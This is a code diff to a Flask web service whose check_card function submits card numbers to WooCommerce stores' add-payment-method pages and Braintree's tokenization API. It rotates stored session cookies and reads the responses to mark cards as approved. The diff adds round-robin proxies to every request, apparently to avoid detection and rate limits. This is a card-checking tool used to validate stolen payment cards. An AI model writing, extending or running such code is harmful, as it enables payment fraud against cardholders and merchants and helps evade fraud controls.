@@ -22,6 +22,8 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 SITES = []
 COOKIES_LIST = []
 current_cookie_index = 0
+PROXIES = []
+current_proxy_index = 0
 
 # Base directory (project root)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -77,6 +79,48 @@ def load_cookies():
         print(f"Loaded {len(COOKIES_LIST)} cookie sets.")
     except Exception as e:
         print(f"Error loading cookies directory: {str(e)}")
+
+def load_proxies():
+    """Load proxies from proxies.txt"""
+    global PROXIES
+    PROXIES = []
+    try:
+        proxy_file = os.path.join(BASE_DIR, 'proxies.txt')
+        if os.path.exists(proxy_file):
+            with open(proxy_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line:
+                        parts = line.split(':')
+                        if len(parts) == 4:
+                            ip, port, user, password = parts
+                            proxy_url = f"http://{user}:{password}@{ip}:{port}"
+                            PROXIES.append({
+                                'http': proxy_url,
+                                'https': proxy_url
+                            })
+                        elif len(parts) == 2:
+                            ip, port = parts
+                            proxy_url = f"http://{ip}:{port}"
+                            PROXIES.append({
+                                'http': proxy_url,
+                                'https': proxy_url
+                            })
+        print(f"Loaded {len(PROXIES)} proxies.")
+    except Exception as e:
+        print(f"Error loading proxies: {str(e)}")
+
+def get_next_proxy():
+    """Get next proxy in round-robin fashion"""
+    global PROXIES, current_proxy_index
+    if not PROXIES:
+        load_proxies()
+    if not PROXIES:
+        return None
+    
+    proxy = PROXIES[current_proxy_index]
+    current_proxy_index = (current_proxy_index + 1) % len(PROXIES)
+    return proxy
 
 def get_next_cookie():
     """Get next cookie set in round-robin fashion"""
@@ -139,10 +183,13 @@ def check_card(cc_line, manual_cookies=None):
         cookies = get_next_cookie()
         cookie_source = "system"
     
+    proxy = get_next_proxy()
+    
     # Log cookie use for debugging
     if cookies:
         cookie_snippet = str(list(cookies.values())[0])[:10] if cookies else "None"
-        print(f"[{cookie_source}] Using cookie: ...{cookie_snippet} for {cc_line[:15]}...")
+        proxy_display = list(proxy.values())[0].split('@')[-1] if proxy else "None"
+        print(f"[{cookie_source}] Using cookie: ...{cookie_snippet} | Proxy: {proxy_display} for {cc_line[:15]}...")
     else:
         return {'status': 'ERROR', 'card': cc_line, 'response': 'No cookies available', 'is_approved': False, 'cookie_source': cookie_source}
 
@@ -158,7 +205,9 @@ def check_card(cc_line, manual_cookies=None):
     try:
         # Step 1: Get Nonce and Client Token
         headers = get_headers(domain_url)
-        response = requests.get(f'{domain_url}/my-account/add-payment-method/', cookies=cookies, headers=headers, verify=False, timeout=30)
+        target_url = f"{domain_url}/my-account/add-payment-method/"
+        print(f"Requesting URL: {target_url}")
+        response = requests.get(target_url, cookies=cookies, headers=headers, proxies=proxy, verify=False, timeout=30)
         
         if response.status_code != 200:
             return {'status': 'ERROR', 'card': cc_line, 'response': f'Page Load Failed: {response.status_code}', 'is_approved': False, 'cookie_source': cookie_source}
@@ -201,7 +250,7 @@ def check_card(cc_line, manual_cookies=None):
             'operationName': 'TokenizeCreditCard',
         }
 
-        gql_response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_data_gql, verify=False, timeout=30)
+        gql_response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_data_gql, proxies=proxy, verify=False, timeout=30)
         
         if gql_response.status_code != 200:
             return {'status': 'ERROR', 'card': cc_line, 'response': f'GQL Error: {gql_response.status_code}', 'is_approved': False, 'cookie_source': cookie_source}
@@ -235,7 +284,7 @@ def check_card(cc_line, manual_cookies=None):
             'woocommerce_add_payment_method': '1',
         }
 
-        final_response = requests.post(f'{domain_url}/my-account/add-payment-method/', cookies=cookies, headers=headers_post, data=post_data, verify=False, timeout=30)
+        final_response = requests.post(f'{domain_url}/my-account/add-payment-method/', cookies=cookies, headers=headers_post, data=post_data, proxies=proxy, verify=False, timeout=30)
         
         soup = BeautifulSoup(final_response.text, 'html.parser')
         error_ul = soup.find('ul', class_='woocommerce-error')
@@ -283,11 +332,13 @@ def check_single():
                 json_data = json.loads(urllib.parse.unquote(json_data))
             
             if isinstance(json_data, list):
-                manual_cookies = {item['name']: item['value'] for item in json_data if 'name' in item and 'value' in item}
+                if len(json_data) > 0:
+                    manual_cookies = {item['name']: item['value'] for item in json_data if 'name' in item and 'value' in item}
+                else:
+                    manual_cookies = None
             elif isinstance(json_data, dict):
                 manual_cookies = json_data
             
-            # Ensure manual_cookies is actually used only if it contains data
             if manual_cookies == {}:
                 manual_cookies = None
         except:
@@ -303,4 +354,5 @@ def health():
 
 if __name__ == '__main__':
     load_cookies()
+    load_proxies()
     app.run(host='0.0.0.0', port=5000, debug=True)
